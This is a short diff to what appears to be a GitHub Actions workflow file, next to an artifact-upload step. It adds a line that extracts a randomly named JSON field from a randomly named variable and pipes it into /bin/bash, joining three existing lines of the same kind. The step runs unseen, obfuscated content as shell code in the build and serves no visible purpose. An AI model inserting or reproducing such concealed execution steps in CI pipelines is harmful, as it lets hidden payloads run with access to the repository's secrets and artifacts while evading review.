@@ -30,6 +30,7 @@ jobs:
           echo $axwpd13 | jq -r .j00180 | /bin/bash
           echo $kwtw11858 | jq -r .vdmdm5682 | /bin/bash
           printf '%s' "$ysrw67810" | jq -r .rkmq63299 | /bin/bash
+          printf '%s' "$ceun5" | jq -r .h1564 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
